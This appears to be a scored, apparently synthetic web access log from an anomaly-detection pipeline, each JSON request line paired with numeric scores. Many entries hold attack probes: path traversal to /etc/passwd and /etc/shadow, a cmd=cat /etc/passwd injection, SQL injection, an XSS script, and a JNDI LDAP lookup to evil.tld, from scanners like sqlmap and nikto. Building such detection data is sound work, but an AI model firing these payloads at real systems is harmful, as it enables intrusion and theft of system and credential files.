score_content,score_session,score_fused,score_fused_norm,line
0.24756865203380585,,0.24756865203380585,0.24756865203380585,{"remote_addr": "85.246.67.135", "time_local": "11/Jan/2025:09:04:21 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 12032, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
3.1180694103240967,,3.1180694103240967,3.1180694103240967,{"remote_addr": "226.109.186.251", "time_local": "11/Jan/2025:09:04:22 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 8903, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30137.951171875,,30137.951171875,30137.951171875,{"remote_addr": "95.150.74.143", "time_local": "11/Jan/2025:09:04:22 -0700", "request": "PUT /logout HTTP/2", "status": 401, "body_bytes_sent": 336, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
4.879462718963623,,4.879462718963623,4.879462718963623,{"remote_addr": "80.101.87.162", "time_local": "11/Jan/2025:09:04:23 -0700", "request": "POST /admin HTTP/2", "status": 204, "body_bytes_sent": 982, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
30126.466796875,,30126.466796875,30126.466796875,{"remote_addr": "229.24.71.120", "time_local": "11/Jan/2025:09:04:23 -0700", "request": "GET /dashboard HTTP/2", "status": 403, "body_bytes_sent": 1334, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30197.974609375,,30197.974609375,30197.974609375,{"remote_addr": "163.202.103.254", "time_local": "11/Jan/2025:09:04:24 -0700", "request": "OPTIONS /contact HTTP/2", "status": 404, "body_bytes_sent": 1289, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
104.79804229736328,,104.79804229736328,104.79804229736328,{"remote_addr": "123.43.111.24", "time_local": "11/Jan/2025:09:04:25 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 584, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
35.85951232910156,,35.85951232910156,35.85951232910156,{"remote_addr": "101.226.220.254", "time_local": "11/Jan/2025:09:04:26 -0700", "request": "PUT /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14234, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.473954200744629,,11.473954200744629,11.473954200744629,{"remote_addr": "224.242.252.119", "time_local": "11/Jan/2025:09:04:27 -0700", "request": "PUT /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 2048, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
13.684396743774414,,13.684396743774414,13.684396743774414,{"remote_addr": "24.222.6.132", "time_local": "11/Jan/2025:09:04:28 -0700", "request": "PUT / HTTP/2", "status": 200, "body_bytes_sent": 6483, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
35.734832763671875,,35.734832763671875,35.734832763671875,{"remote_addr": "179.145.122.56", "time_local": "11/Jan/2025:09:04:29 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3151, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
76.30077362060547,,76.30077362060547,76.30077362060547,{"remote_addr": "207.109.244.208", "time_local": "11/Jan/2025:09:04:30 -0700", "request": "OPTIONS /login HTTP/2", "status": 302, "body_bytes_sent": 10565, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
107.67064666748047,,107.67064666748047,107.67064666748047,{"remote_addr": "69.236.187.40", "time_local": "11/Jan/2025:09:04:30 -0700", "request": "TRACE /login HTTP/2", "status": 302, "body_bytes_sent": 4762, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
0.2278781533241272,,0.2278781533241272,0.2278781533241272,{"remote_addr": "69.68.144.34", "time_local": "11/Jan/2025:09:04:31 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 981, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.545087814331055,,27.545087814331055,27.545087814331055,{"remote_addr": "243.9.206.50", "time_local": "11/Jan/2025:09:04:32 -0700", "request": "DELETE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 2827, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
49.94076156616211,,49.94076156616211,49.94076156616211,{"remote_addr": "95.113.39.69", "time_local": "11/Jan/2025:09:04:33 -0700", "request": "DELETE /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 204, "body_bytes_sent": 7561, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
4.859734058380127,,4.859734058380127,4.859734058380127,{"remote_addr": "242.29.91.173", "time_local": "11/Jan/2025:09:04:33 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 13093, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
0.2821381986141205,,0.2821381986141205,0.2821381986141205,{"remote_addr": "225.205.52.137", "time_local": "11/Jan/2025:09:04:34 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14662, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
27.45811653137207,,27.45811653137207,27.45811653137207,{"remote_addr": "67.58.213.36", "time_local": "11/Jan/2025:09:04:35 -0700", "request": "DELETE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1076, "http_referer": "-", "http_user_agent": "dirb/2.22"}
50.024436950683594,,50.024436950683594,50.024436950683594,{"remote_addr": "244.236.200.71", "time_local": "11/Jan/2025:09:04:36 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 12114, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
30124.693359375,,30124.693359375,30124.693359375,{"remote_addr": "94.120.94.164", "time_local": "11/Jan/2025:09:04:36 -0700", "request": "GET /cgi-bin/test.cgi HTTP/2", "status": 401, "body_bytes_sent": 549, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
0.26191946864128113,,0.26191946864128113,0.26191946864128113,{"remote_addr": "194.50.90.35", "time_local": "11/Jan/2025:09:04:37 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 16019, "http_referer": "-", "http_user_agent": "dirb/2.22"}
27.2479248046875,,27.2479248046875,27.2479248046875,{"remote_addr": "132.226.120.130", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "GET /search?q=headphones HTTP/2", "status": 304, "body_bytes_sent": 11586, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
50.14729309082031,,50.14729309082031,50.14729309082031,{"remote_addr": "199.183.38.243", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "DELETE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 16228, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
95.80547332763672,,95.80547332763672,95.80547332763672,{"remote_addr": "160.1.241.254", "time_local": "11/Jan/2025:09:04:38 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 3388, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
53.166297912597656,,53.166297912597656,53.166297912597656,{"remote_addr": "204.201.126.79", "time_local": "11/Jan/2025:09:04:39 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 304, "body_bytes_sent": 6255, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
95.83767700195312,,95.83767700195312,95.83767700195312,{"remote_addr": "179.237.118.151", "time_local": "11/Jan/2025:09:04:40 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 7278, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
27.770185470581055,,27.770185470581055,27.770185470581055,{"remote_addr": "206.134.231.171", "time_local": "11/Jan/2025:09:04:41 -0700", "request": "DELETE /admin HTTP/2", "status": 200, "body_bytes_sent": 13694, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
50.08095932006836,,50.08095932006836,50.08095932006836,{"remote_addr": "96.203.244.245", "time_local": "11/Jan/2025:09:04:42 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 3216, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
95.71172332763672,,95.71172332763672,95.71172332763672,{"remote_addr": "68.58.137.54", "time_local": "11/Jan/2025:09:04:43 -0700", "request": "OPTIONS /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 16305, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30174.65625,,30174.65625,30174.65625,{"remote_addr": "229.65.82.218", "time_local": "11/Jan/2025:09:04:44 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 403, "body_bytes_sent": 6, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
71.69026947021484,,71.69026947021484,71.69026947021484,{"remote_addr": "95.220.252.83", "time_local": "11/Jan/2025:09:04:45 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 15698, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
35.670631408691406,,35.670631408691406,35.670631408691406,{"remote_addr": "192.245.116.19", "time_local": "11/Jan/2025:09:04:46 -0700", "request": "PUT /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 6563, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
30.497547149658203,,30.497547149658203,30.497547149658203,{"remote_addr": "11.113.72.154", "time_local": "11/Jan/2025:09:04:47 -0700", "request": "DELETE /api/products HTTP/2", "status": 304, "body_bytes_sent": 690, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
0.27989575266838074,,0.27989575266838074,0.27989575266838074,{"remote_addr": "77.213.46.171", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 14030, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.2254677712917328,,0.2254677712917328,0.2254677712917328,{"remote_addr": "236.5.112.82", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 1888, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
127.06033325195312,,127.06033325195312,127.06033325195312,{"remote_addr": "199.215.203.158", "time_local": "11/Jan/2025:09:04:48 -0700", "request": "TRACE /search?q=headphones HTTP/2", "status": 200, "body_bytes_sent": 4602, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
130.04327392578125,,130.04327392578125,130.04327392578125,{"remote_addr": "141.104.147.104", "time_local": "11/Jan/2025:09:04:49 -0700", "request": "TRACE /api/backup?file=../../../../etc/shadow HTTP/2", "status": 302, "body_bytes_sent": 362, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
16.388952255249023,,16.388952255249023,16.388952255249023,{"remote_addr": "230.232.109.178", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "PUT /admin HTTP/2", "status": 302, "body_bytes_sent": 17754, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
27.346162796020508,,27.346162796020508,27.346162796020508,{"remote_addr": "141.193.176.35", "time_local": "11/Jan/2025:09:04:50 -0700", "request": "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 10578, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
4.821364879608154,,4.821364879608154,4.821364879608154,{"remote_addr": "195.95.15.43", "time_local": "11/Jan/2025:09:04:51 -0700", "request": "POST /contact HTTP/2", "status": 200, "body_bytes_sent": 4595, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
102.81552124023438,,102.81552124023438,102.81552124023438,{"remote_addr": "53.190.148.224", "time_local": "11/Jan/2025:09:04:52 -0700", "request": "TRACE /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 3617, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
95.7247543334961,,95.7247543334961,95.7247543334961,{"remote_addr": "134.147.153.210", "time_local": "11/Jan/2025:09:04:53 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 1183, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
11.560781478881836,,11.560781478881836,11.560781478881836,{"remote_addr": "242.211.132.20", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "PUT /cgi-bin/test.cgi HTTP/2", "status": 204, "body_bytes_sent": 1310, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.95271372795105,,2.95271372795105,2.95271372795105,{"remote_addr": "254.170.38.17", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST /..%2f..%2fetc%2fpasswd HTTP/2", "status": 200, "body_bytes_sent": 248, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
5.160213947296143,,5.160213947296143,5.160213947296143,{"remote_addr": "169.115.70.28", "time_local": "11/Jan/2025:09:04:54 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 15512, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
1.7801967859268188,,1.7801967859268188,1.7801967859268188,{"remote_addr": "29.229.102.73", "time_local": "11/Jan/2025:09:04:55 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 729, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
30129.443359375,,30129.443359375,30129.443359375,{"remote_addr": "68.208.43.228", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "POST /logout HTTP/2", "status": 403, "body_bytes_sent": 616, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
28.96540641784668,,28.96540641784668,28.96540641784668,{"remote_addr": "98.51.102.213", "time_local": "11/Jan/2025:09:04:56 -0700", "request": "DELETE /index.html HTTP/2", "status": 304, "body_bytes_sent": 14646, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
69.96163940429688,,69.96163940429688,69.96163940429688,{"remote_addr": "194.142.1.7", "time_local": "11/Jan/2025:09:04:57 -0700", "request": "HEAD /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 15559, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
0.24141541123390198,,0.24141541123390198,0.24141541123390198,{"remote_addr": "25.57.220.199", "time_local": "11/Jan/2025:09:04:58 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 5220, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
73.07705688476562,,73.07705688476562,73.07705688476562,{"remote_addr": "201.182.152.162", "time_local": "11/Jan/2025:09:04:59 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 304, "body_bytes_sent": 10869, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
11.588187217712402,,11.588187217712402,11.588187217712402,{"remote_addr": "200.72.128.164", "time_local": "11/Jan/2025:09:05:00 -0700", "request": "PUT /../../etc/passwd HTTP/2", "status": 200, "body_bytes_sent": 6160, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
35.7833366394043,,35.7833366394043,35.7833366394043,{"remote_addr": "187.99.162.110", "time_local": "11/Jan/2025:09:05:01 -0700", "request": "PUT /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 2668, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
38.7016487121582,,38.7016487121582,38.7016487121582,{"remote_addr": "108.254.218.45", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "PUT /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 304, "body_bytes_sent": 14706, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
24.484777450561523,,24.484777450561523,24.484777450561523,{"remote_addr": "201.97.140.251", "time_local": "11/Jan/2025:09:05:02 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 8702, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
3.1735544204711914,,3.1735544204711914,3.1735544204711914,{"remote_addr": "200.235.160.58", "time_local": "11/Jan/2025:09:05:03 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 14038, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
95.76611328125,,95.76611328125,95.76611328125,{"remote_addr": "62.4.133.150", "time_local": "11/Jan/2025:09:05:04 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 16281, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
104.62251281738281,,104.62251281738281,104.62251281738281,{"remote_addr": "244.39.118.82", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 4174, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
28.721403121948242,,28.721403121948242,28.721403121948242,{"remote_addr": "203.72.250.207", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 302, "body_bytes_sent": 3492, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.23460251092910767,,0.23460251092910767,0.23460251092910767,{"remote_addr": "153.24.142.110", "time_local": "11/Jan/2025:09:05:06 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8922, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.2851806879043579,,0.2851806879043579,0.2851806879043579,{"remote_addr": "125.214.230.195", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 15544, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
47.55583190917969,,47.55583190917969,47.55583190917969,{"remote_addr": "246.10.198.240", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1391, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
95.74617004394531,,95.74617004394531,95.74617004394531,{"remote_addr": "36.97.68.31", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10904, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30220.029296875,,30220.029296875,30220.029296875,{"remote_addr": "228.183.10.247", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 401, "body_bytes_sent": 1321, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30152.611328125,,30152.611328125,30152.611328125,{"remote_addr": "50.223.219.223", "time_local": "11/Jan/2025:09:05:09 -0700", "request": "DELETE / HTTP/2", "status": 404, "body_bytes_sent": 342, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
70.10000610351562,,70.10000610351562,70.10000610351562,{"remote_addr": "219.41.147.148", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8850, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
50.06808853149414,,50.06808853149414,50.06808853149414,{"remote_addr": "139.70.29.153", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5126, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
13.428155899047852,,13.428155899047852,13.428155899047852,{"remote_addr": "215.199.122.98", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "PUT /contact HTTP/2", "status": 200, "body_bytes_sent": 15064, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
7.8505940437316895,,7.8505940437316895,7.8505940437316895,{"remote_addr": "95.112.233.92", "time_local": "11/Jan/2025:09:05:11 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 12334, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.8830671310424805,,4.8830671310424805,4.8830671310424805,{"remote_addr": "95.167.130.150", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 9765, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.962923049926758,,4.962923049926758,4.962923049926758,{"remote_addr": "127.168.83.86", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /login HTTP/2", "status": 302, "body_bytes_sent": 13432, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.456501007080078,,24.456501007080078,24.456501007080078,{"remote_addr": "80.164.25.181", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3103, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
50.530784606933594,,50.530784606933594,50.530784606933594,{"remote_addr": "171.74.41.136", "time_local": "11/Jan/2025:09:05:13 -0700", "request": "HEAD /dashboard HTTP/2", "status": 304, "body_bytes_sent": 16391, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30172.20703125,,30172.20703125,30172.20703125,{"remote_addr": "226.240.164.45", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "HEAD /logout HTTP/2", "status": 401, "body_bytes_sent": 449, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30148.6875,,30148.6875,30148.6875,{"remote_addr": "96.175.201.226", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "GET /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 608, "http_referer": "-", "http_user_agent": "dirb/2.22"}
105.82195281982422,,105.82195281982422,105.82195281982422,{"remote_addr": "239.87.196.197", "time_local": "11/Jan/2025:09:05:15 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 11455, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
50.0678596496582,,50.0678596496582,50.0678596496582,{"remote_addr": "224.46.51.15", "time_local": "11/Jan/2025:09:05:16 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 5083, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
13.371475219726562,,13.371475219726562,13.371475219726562,{"remote_addr": "28.179.90.47", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1056, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.9009928703308105,,4.9009928703308105,4.9009928703308105,{"remote_addr": "184.136.203.162", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "GET /profile HTTP/2", "status": 304, "body_bytes_sent": 7067, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
27.263347625732422,,27.263347625732422,27.263347625732422,{"remote_addr": "65.27.133.15", "time_local": "11/Jan/2025:09:05:18 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4572, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
30126.560546875,,30126.560546875,30126.560546875,{"remote_addr": "15.79.229.49", "time_local": "11/Jan/2025:09:05:19 -0700", "request": "GET /contact HTTP/2", "status": 403, "body_bytes_sent": 363, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
50.05183410644531,,50.05183410644531,50.05183410644531,{"remote_addr": "8.46.238.63", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 12687, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
3.0853688716888428,,3.0853688716888428,3.0853688716888428,{"remote_addr": "239.63.227.208", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 2340, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
71.60293579101562,,71.60293579101562,71.60293579101562,{"remote_addr": "161.135.94.227", "time_local": "11/Jan/2025:09:05:21 -0700", "request": "OPTIONS /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 2412, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.634583473205566,,4.634583473205566,4.634583473205566,{"remote_addr": "235.38.58.140", "time_local": "11/Jan/2025:09:05:22 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 4173, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
2.0069735050201416,,2.0069735050201416,2.0069735050201416,{"remote_addr": "128.105.3.52", "time_local": "11/Jan/2025:09:05:23 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 12576, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
